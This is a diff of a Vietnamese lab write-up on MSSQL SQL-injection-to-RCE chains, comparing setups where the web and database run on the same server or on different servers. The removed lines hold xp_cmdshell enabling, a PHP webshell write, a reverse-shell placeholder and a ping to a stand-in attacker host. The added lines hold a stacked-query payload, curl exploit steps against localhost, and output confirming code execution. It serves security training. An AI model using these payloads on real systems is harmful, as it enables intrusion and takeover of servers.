@@ -1,85 +1,59 @@
-# Task 4: RCE MSSQL - Cùng Server vs Khác Server
+# Task 4 - RCE via Stacked Query on MSSQL
 
 
-## Bật xp_cmdshell
-Thường phải bật `show advanced options` trước, rồi mới bật `xp_cmdshell`:
-```sql
-1'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
-```
+- Tham so product_id duoc noi chuoi truc tiep vao cau lenh SQL tren MSSQL.
+- Khi chen dau ; va cau UPDATE, ung dung van bao search completed.
 
-Sau đó kiểm tra bằng lệnh ngắn:
-```sql
-1'; EXEC xp_cmdshell 'whoami'; --
-```
+- Chuoi tan cong: SQLi (MSSQL stacked query) -> doi diag_target -> trigger Maintenance -> RCE.
 
-Nếu trả ra user của Windows/MSSQL, nghĩa là command đã chạy được.
-
-## Case 1: Web Và DB Cùng Server
-Khi web và DB cùng máy, lệnh từ `xp_cmdshell` có thể nhìn thấy cả file system của web server. Đây là trường hợp đơn nhất vì có thể ghi webshell trực tiếp vào thư mục web.
-
-Ví dụ:
-```sql
-1'; EXEC xp_cmdshell 'echo "<?php system($_GET[\"cmd\"]); ?>" > C:\inetpub\wwwroot\shell.php'; --
-```
-
-Nếu thư mục web đúng là `C:\inetpub\wwwroot\` hoặc một document root tương tự, ta sẽ truy cập được:
+### 2.3 Payload cot loi
 ```text
-http://localhost:8051/shell.php?cmd=whoami
+1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--
 ```
 
-### Cách nhận biết cùng server
-1. So sánh hostname.
-```sql
-SELECT @@SERVERNAME;
-```
-Rồi chạy:
-```sql
-EXEC xp_cmdshell 'hostname';
-```
-Nếu tên host trùng nhau hoặc rất giống nhau, khả năng cao là cùng máy.
+Ly do chon id: output uid/gid xac nhan ro RCE tren he thong web.
 
-2. Kiểm tra đường dẫn web phổ biến.
-```sql
-EXEC xp_cmdshell 'DIR C:\inetpub\wwwroot\';
-EXEC xp_cmdshell 'DIR C:\xampp\htdocs\';
-```
-Nếu thấy file web ở đây, DB và web thường cùng host.
+## 3. Cac buoc khai thac toi thieu
 
-3. Dùng ping vào chính web/app.
-```sql
-EXEC xp_cmdshell 'ping localhost';
-```
-Nếu web đang chạy ngay trên máy DB, `localhost` sẽ trả về đúng machine đó.
+### 3.1 Case 1 (same-server)
+```bash
+curl -X POST http://localhost:8051/index.php \
+  -d "action=search&product_id=1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--"
 
-## Case 2: Web Và DB Khác Server
-Khi web và DB tách nhau, `xp_cmdshell` vẫn chạy được nhưng nó chỉ chạy trên máy DB. Vì vậy, việc ghi webshell vào thư mục web thường không có tác dụng, do thư mục đó không nằm trên máy DB.
-
-Trong case này, cách khai thác hợp lý hơn là reverse shell, thực thi lệnh chỉ để lấy thông tin máy DB.
-
-```sql
-1'; EXEC master..xp_cmdshell 'powershell -c "...reverse-shell-code..."'; --
+curl -X POST http://localhost:8051/index.php -d "action=diag"
+curl -X POST http://localhost:8051/index.php -d "action=hostcheck"
 ```
 
-### Cách nhận biết khác server
-1. Ping ra ngoài một webhook hoặc host bạn kiểm soát.
-```sql
-EXEC xp_cmdshell 'ping attacker-webhook.com';
-```
-Nếu log source IP ở webhook khác với IP của web server, hai máy đang tách nhau.
+### 3.2 Case 2 (different-server)
+```bash
+curl -X POST http://localhost:8052/index.php \
+  -d "action=search&product_id=1; UPDATE rce_test.dbo.app_config SET config_value='id' WHERE config_key='diag_target';--"
 
-2. Kiểm tra hostname của máy DB và web không trùng.
-```sql
-SELECT @@SERVERNAME;
-EXEC xp_cmdshell 'hostname';
+curl -X POST http://localhost:8052/index.php -d "action=diag"
+curl -X POST http://localhost:8052/index.php -d "action=hostcheck"
 ```
-Nếu khác nhau rõ ràng, rất có thể là hai host riêng.
 
-3. Tìm document root trên máy DB nhưng không thấy.
-```sql
-EXEC xp_cmdshell 'DIR C:\inetpub\wwwroot\';
-EXEC xp_cmdshell 'DIR C:\xampp\htdocs\';
-```
-Nếu không có thư mục web hoặc không có file web quen thuộc, DB có thể đang ở máy riêng.
+## 4. Bang chung da kiem thu
 
-4. Thử write file nhưng không truy cập được từ web.
-Đây là dấu hiệu rất thực tế: command chạy xong trên DB, nhưng file không hiện trên web vì web nằm ở máy khác.
+### Case 1
+- Search: Search completed (stacked query executed).
+- Diag: Maintenance command executed on web from MSSQL-stored value: id.
+- Output command: uid=33(www-data) gid=33(www-data) groups=33(www-data).
+- Host check:
+  - Web host: 2b65061f7b1d
+  - DB host: 2b65061f7b1d
+  - DB endpoint from web: 127.0.0.1 => likely SAME server.
+
+Ket luan: Dat yeu cau same-server va co chuoi RCE via stacked query tren MSSQL.
+
+### Case 2
+- Search: Search completed (stacked query executed).
+- Diag: Maintenance command executed on web from MSSQL-stored value: id.
+- Output command: uid=33(www-data) gid=33(www-data) groups=33(www-data).
+- Host check:
+  - Web host: 9f4cdf51ff68
+  - DB host: fcf3ece0171f
+  - DB endpoint from web: task4-case2-mssql => likely DIFFERENT server.
+
+Ket luan: Dat yeu cau different-server va co chuoi RCE via stacked query tren MSSQL.
+
